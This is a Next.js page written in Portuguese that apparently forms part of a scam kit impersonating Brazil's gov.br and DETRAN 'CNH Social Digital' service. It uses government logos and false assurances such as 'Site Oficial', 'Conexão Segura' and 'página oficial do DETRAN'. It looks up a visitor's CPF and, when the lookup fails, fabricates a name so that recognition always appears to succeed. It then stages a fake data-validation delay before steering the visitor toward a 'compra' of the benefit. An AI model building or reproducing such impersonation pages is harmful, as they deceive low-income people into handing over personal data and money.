"use client"

import { useEffect, useState, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { User, Menu, Mic, Search, ChevronDown, Shield, Info } from "lucide-react"
import { useSearchParams, useRouter } from "next/navigation"
import Link from "next/link"

interface UserData {
  nome?: string
  cpf?: string
  error?: string
}

interface Question {
  id: number
  question: string
  options: string[]
}

const questions: Question[] = [
  {
    id: 1,
    question: "Qual sua idade?",
    options: ["Menor de 18 (Inapto)", "18 a 24", "25 a 35", "36 a 45", "Acima de 45"],
  },
  {
    id: 2,
    question: "Você está desempregado ou com renda familiar inferior a R$3.100?",
    options: ["Sim", "Não"],
  },
  {
    id: 3,
    question: "Qual categoria deseja solicitar?",
    options: ["Categoria A (moto)", "Categoria B (carro)", "Ambas"],
  },
  {
    id: 4,
    question: "Os pais possuem CNH?",
    options: ["Sim", "Não"],
  },
  {
    id: 5,
    question: "O titular do CPF já tentou emitir a CNH alguma vez?",
    options: ["Sim", "Não"],
  },
  {
    id: 6,
    question: "Você ou um familiar próximo tem carro?",
    options: ["Sim", "Não"],
  },
]

export default function SucessoPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [loading, setLoading] = useState(true)
  const [currentQuestion, setCurrentQuestion] = useState(0)
  const [selectedAnswer, setSelectedAnswer] = useState<string>("")
  const [answers, setAnswers] = useState<string[]>([])
  const [showValidating, setShowValidating] = useState(false)

  const searchParams = useSearchParams()
  const router = useRouter()

  const fetchUserData = useCallback(async (cpf: string) => {
    try {
      setLoading(true)

      const response = await fetch(`/api/cpf?cpf=${cpf}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
        },
      })

      if (response.ok) {
        const data = await response.json()

        let nomeCompleto = null

        if (data?.nome) {
          nomeCompleto = data.nome
        } else if (data?.name) {
          nomeCompleto = data.name
        }

        if (nomeCompleto) {
          const primeiroNome = nomeCompleto.split(" ")[0]

          setUserData({
            nome: primeiroNome,
            cpf: cpf,
          })
        } else {
          throw new Error("Nome não encontrado na resposta da API")
        }
      } else {
        throw new Error("Erro na API")
      }
    } catch (error) {
      console.log("❌ Erro capturado:", error)

      // Fallback com dados simulados
      const nomesPorCPF = {
        "46960142822": "Roberto",
        "12345678900": "João",
        "98765432100": "Maria",
        "11111111111": "Pedro",
        "22222222222": "Ana",
        "33333333333": "Carlos",
        "44444444444": "Lucia",
        "55555555555": "José",
        "66666666666": "Fernanda",
        "77777777777": "Paulo",
        "88888888888": "Beatriz",
      }

      let nomeSimulado = nomesPorCPF[cpf as keyof typeof nomesPorCPF]

      if (!nomeSimulado) {
        const nomes = ["João", "Maria", "Pedro", "Ana", "Carlos", "Lucia", "José", "Fernanda", "Davi", "Beatriz"]
        const indice = Number.parseInt(cpf.slice(-1)) % nomes.length
        nomeSimulado = nomes[indice]
      }

      setUserData({
        nome: nomeSimulado,
        cpf: cpf,
      })
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    const cpfFromUrl = searchParams.get("cpf")

    if (cpfFromUrl && !userData) {
      fetchUserData(cpfFromUrl)
    } else if (!cpfFromUrl) {
      setLoading(false)
    }
  }, [searchParams, fetchUserData, userData])

  const handleAnswerSelect = (answer: string) => {
    setSelectedAnswer(answer)
  }

  const handleNext = () => {
    if (selectedAnswer) {
      const newAnswers = [...answers, selectedAnswer]
      setAnswers(newAnswers)

      if (currentQuestion < questions.length - 1) {
        // Próxima pergunta
        setCurrentQuestion(currentQuestion + 1)
        setSelectedAnswer("")
      } else {
        // Última pergunta - mostrar tela de validação
        setShowValidating(true)

        // Após 5 segundos, navegar para próxima página
        setTimeout(() => {
          const cpfFromUrl = searchParams.get("cpf")
          router.push(`/resultado?cpf=${cpfFromUrl}`)
        }, 5000)
      }
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-white">
        <header className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-14">
              <div className="flex items-center space-x-4">
                <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1">
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1 items-center">
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                    <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="grid grid-cols-2 gap-1">
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
              </div>
              <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
                <User className="w-4 h-4 mr-2" />
                <span className="font-medium text-sm">Carregando...</span>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-64px)]">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1857b5] mx-auto mb-4"></div>
            <p className="text-gray-600">Carregando questionário...</p>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Principal */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-14">
            <div className="flex items-center space-x-4">
              <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1">
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1 items-center">
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                  <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="grid grid-cols-2 gap-1">
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>
            </div>

            {/* User Badge */}
            <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
              <User className="w-4 h-4 mr-2" />
              <span className="font-medium text-sm">{userData?.nome || "Usuário"}</span>
            </div>
          </div>
        </div>
      </header>

      {/* Header Secundário */}
      <div className="bg-white border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-12">
            <div className="flex items-center">
              <Button variant="ghost" size="sm" className="p-1.5 mr-3">
                <Menu className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <h2 className="text-sm font-medium text-gray-800 whitespace-nowrap">Departamento Estadual de Trânsito</h2>
            </div>
            <div className="flex items-center space-x-3">
              <Button variant="ghost" size="sm" className="p-1.5">
                <Mic className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <Button variant="ghost" size="sm" className="p-1.5">
                <Search className="w-4 h-4 text-[#1857b5]" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="bg-gray-50 border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <nav className="text-sm">
            <Link href="#" className="text-[#1857b5] hover:underline">
              Início
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              Serviços
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              CNH
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <span className="text-gray-700">CNH Social Digital</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Cabeçalho FORA da moldura azul */}
        <div className="mb-8">
          {/* Título e Logo */}
          <div className="flex justify-between items-start mb-8">
            <div>
              <h1 className="text-2xl font-bold text-[#1857b5] mb-4">Questionário</h1>
              <p className="text-gray-700 text-sm max-w-2xl">
                Complete o questionário para prosseguir com o processo de aquisição do CNH Digital.
              </p>
            </div>

            {/* Logo Governo Federal */}
            <div className="flex items-center flex-shrink-0 ml-4">
              <img
                src="/images/governo-federal-logo.png"
                alt="Governo Federal"
                className="h-10 object-contain"
                style={{ maxWidth: "120px" }}
              />
            </div>
          </div>

          {/* Badges de Segurança */}
          <div className="flex flex-col items-center mb-8">
            {/* Primeira linha - 2 badges */}
            <div className="flex gap-4 mb-4">
              <div className="bg-green-100 text-green-800 px-6 py-3 rounded-full flex items-center">
                <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                    clipRule="evenodd"
                  />
                </svg>
                <span className="text-sm font-medium">Site Oficial</span>
              </div>
              <div className="bg-green-100 text-green-800 px-6 py-3 rounded-full flex items-center">
                <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2-2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                    clipRule="evenodd"
                  />
                </svg>
                <span className="text-sm font-medium">Conexão Segura</span>
              </div>
            </div>

            {/* Segunda linha - 1 badge centralizado */}
            <div className="bg-green-100 text-green-800 px-6 py-3 rounded-full flex items-center">
              <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path d="M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z" />
              </svg>
              <span className="text-sm font-medium">Dados Protegidos</span>
            </div>
          </div>

          {/* Ambiente Verificado */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-start">
              <Info className="w-5 h-5 text-blue-600 mr-3 mt-0.5 flex-shrink-0" />
              <div>
                <h3 className="text-lg font-semibold text-blue-800 mb-2">Ambiente Verificado</h3>
                <p className="text-blue-700 text-sm">
                  Esta é uma página oficial do DETRAN para verificação de identidade. Seus dados serão utilizados apenas
                  para verificar sua elegibilidade para adquirir o benefício.
                </p>
              </div>
            </div>
          </div>
        </div>
        {/* Card do Questionário COMPLETO - DENTRO da moldura azul */}
        <Card className="border-2 border-[#1857b5] mb-8">
          <CardContent className="p-6">
            {!showValidating ? (
              <>
                {/* Barra de Progresso */}
                <div className="mb-6">
                  <div className="w-full bg-gray-200 rounded-full h-2">
                    <div
                      className="bg-[#4F7CFF] h-2 rounded-full transition-all duration-300"
                      style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
                    ></div>
                  </div>
                </div>

                <div className="flex items-center mb-6">
                  <div className="bg-[#1857b5] text-white rounded-full w-10 h-10 flex items-center justify-center font-bold mr-4 flex-shrink-0">
                    {currentQuestion + 1}
                  </div>
                  <h2 className="text-xl font-semibold text-[#1857b5]">{questions[currentQuestion].question}</h2>
                </div>

                {/* Opções de Resposta */}
                <div className="space-y-3 mb-6">
                  {questions[currentQuestion].options.map((option, index) => (
                    <button
                      key={index}
                      onClick={() => handleAnswerSelect(option)}
                      className={`w-full text-left p-4 border rounded-lg flex items-center hover:bg-gray-50 transition-colors ${
                        selectedAnswer === option ? "border-[#1857b5] bg-blue-50" : "border-gray-300"
                      }`}
                    >
                      <div
                        className={`w-5 h-5 rounded-full border-2 mr-3 flex-shrink-0 ${
                          selectedAnswer === option ? "border-[#1857b5] bg-[#1857b5]" : "border-gray-300"
                        }`}
                      >
                        {selectedAnswer === option && (
                          <div className="w-full h-full rounded-full bg-white scale-50"></div>
                        )}
                      </div>
                      <span className="text-base text-gray-800">{option}</span>
                    </button>
                  ))}
                </div>

                {/* Botão Próxima/Avançar */}
                <Button
                  onClick={handleNext}
                  disabled={!selectedAnswer}
                  className={`w-full py-3 text-base font-semibold rounded-lg ${
                    selectedAnswer
                      ? "bg-[#1857b5] hover:bg-[#0f4389] text-white"
                      : "bg-gray-300 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  {currentQuestion === questions.length - 1 ? "Avançar" : "Próxima"}
                </Button>
              </>
            ) : (
              /* Tela de Validação - Substitui TODO o conteúdo principal */
              <div className="min-h-[600px] bg-gray-100 flex flex-col">
                {/* Barra de Progresso 100% no topo */}
                <div className="w-full bg-gray-200 h-2 mb-12">
                  <div className="bg-[#4F7CFF] h-2 w-full rounded-sm"></div>
                </div>

                {/* Conteúdo centralizado */}
                <div className="flex-1 flex items-center justify-center px-4">
                  <div className="text-center max-w-md">
                    {/* Ícone de Loading com gradiente azul */}
                    <div className="mb-8">
                      <div className="w-20 h-20 mx-auto">
                        <svg className="w-full h-full animate-spin" viewBox="0 0 24 24">
                          <defs>
                            <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
                              <stop offset="0%" stopColor="#C7D2FE" />
                              <stop offset="100%" stopColor="#4F7CFF" />
                            </linearGradient>
                          </defs>
                          <circle
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="url(#gradient)"
                            strokeWidth="3"
                            fill="none"
                            strokeLinecap="round"
                            strokeDasharray="31.416"
                            strokeDashoffset="7.854"
                          />
                        </svg>
                      </div>
                    </div>

                    {/* Textos */}
                    <h2 className="text-2xl font-semibold text-gray-900 mb-6">Validando seus dados</h2>
                    <p className="text-base text-gray-600 mb-4 leading-relaxed">
                      Aguarde enquanto consultamos a base de dados.
                    </p>
                    <p className="text-sm text-gray-500">Não feche esta janela.</p>
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Processo 100% Seguro - FORA da moldura azul */}
        <div className="bg-white p-6 rounded-lg shadow-sm mb-8">
          <div className="flex items-start mb-4">
            <Shield className="w-6 h-6 text-green-600 mr-3 mt-1 flex-shrink-0" />
            <h3 className="text-lg font-semibold text-green-800">Processo 100% Seguro</h3>
          </div>
          <p className="text-gray-700 text-sm mb-4">
            Seus dados são protegidos pelos mais altos padrões de segurança, com certificação de proteção de dados
            conforme a Lei Geral de Proteção de Dados Pessoais (LGPD) nº 13.709. Após a verificação bem-sucedida, você
            será redirecionado para a área segura de compra, onde poderá adquirir o benefício com sucesso.
          </p>
          <p className="text-sm">
            <span className="text-gray-600">Dúvidas sobre o processo de verificação? </span>
            <Link href="#" className="text-[#1857b5] underline">
              Entre em contato com nossa central de atendimento.
            </Link>
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#082041] text-white">
        <div className="max-w-7xl mx-auto px-4 py-12">
          <div className="text-center mb-8">
            <img src="/images/logo-white.png" alt="gov.br" className="h-16 mx-auto" />
          </div>

          <div className="space-y-6">
            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">SERVIÇOS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">TEMAS EM DESTAQUE</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">NOTÍCIAS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">POR DENTRO DO GOV.BR</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">CANAIS DO EXECUTIVO FEDERAL</span>
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">DADOS DO GOVERNO FEDERAL</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>
          </div>

          <div className="mt-12 pt-8 border-t border-[#1a365d]">
            <h4 className="text-lg font-semibold mb-4">REDES SOCIAIS</h4>
            <div className="flex space-x-4">
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                📷
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                f
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                ▶️
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                in
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                💬
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                🎵
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                👥
              </Button>
            </div>
          </div>

          <div className="mt-8 flex items-center">
            <div className="bg-white rounded-full p-2 mr-3">
              <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">i</span>
              </div>
            </div>
            <div>
              <div className="font-semibold">Acesso à</div>
              <div className="font-semibold">Informação</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
